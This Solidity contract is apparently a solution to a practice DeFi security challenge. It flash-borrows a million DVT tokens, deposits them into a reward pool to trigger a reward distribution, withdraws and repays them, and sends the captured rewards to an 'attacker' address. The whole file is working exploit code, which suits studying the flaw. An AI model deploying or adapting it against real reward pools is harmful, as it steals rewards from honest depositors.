// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IFlashloanerPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;
}

interface IERC20 {
    function approve(address sender, uint256 amount) external;

    function transfer(address to, uint256 amount) external;

    function balanceOf(address account) external view returns (uint256);
}

contract FlashloanReceiver {
    // Storing addresses in state variable so we can access them in 'attackRewardPool' function
    IFlashloanerPool public flashloanerPool;
    IRewardPool public rewardPool;
    IERC20 public dvtTokens;

    uint256 public constant FLASH_LOAN_AMOUNT = 1000000 ether;

    // to avoid unused parameter warning in receiveFlashLoan function
    event FlashloanReceived(uint256 amount);

    function executeFlashloan(
        IFlashloanerPool _flashloanerPool,
        IRewardPool _rewardPool,
        IERC20 _dvtTokens,
        IERC20 _rewardToken,
        address attacker
    ) external {
        // Setting values in state variable
        flashloanerPool = _flashloanerPool;
        rewardPool = _rewardPool;
        dvtTokens = _dvtTokens;

        // Asking for loan
        flashloanerPool.flashLoan(FLASH_LOAN_AMOUNT);

        // Transferring reward token to the attacker
        _rewardToken.transfer(attacker, _rewardToken.balanceOf(address(this)));
    }

    // This function will be called by 'FlashLoanerPool' after giving loan, triggering 'attackRewardPool'
    // when it's called by 'FlashLoanerPool'
    function receiveFlashLoan(uint256 amount) external {
        require(
            msg.sender == address(flashloanerPool),
            "Caller is not flashloaner pool"
        );
        attackRewardPool();
        emit FlashloanReceived(amount);
    }

    function attackRewardPool() public {
        // giving approval of dvt tokens to reward pool
        dvtTokens.approve(address(rewardPool), type(uint256).max);

        // depositing dvt tokens (will also trigger distribute reward)
        rewardPool.deposit(FLASH_LOAN_AMOUNT);

        // withdrawing deposited dvt tokens
        rewardPool.withdraw(FLASH_LOAN_AMOUNT);

        // transferring borrowed dvt tokens to flashLoanerPool
        dvtTokens.transfer(address(flashloanerPool), FLASH_LOAN_AMOUNT);
    }
}
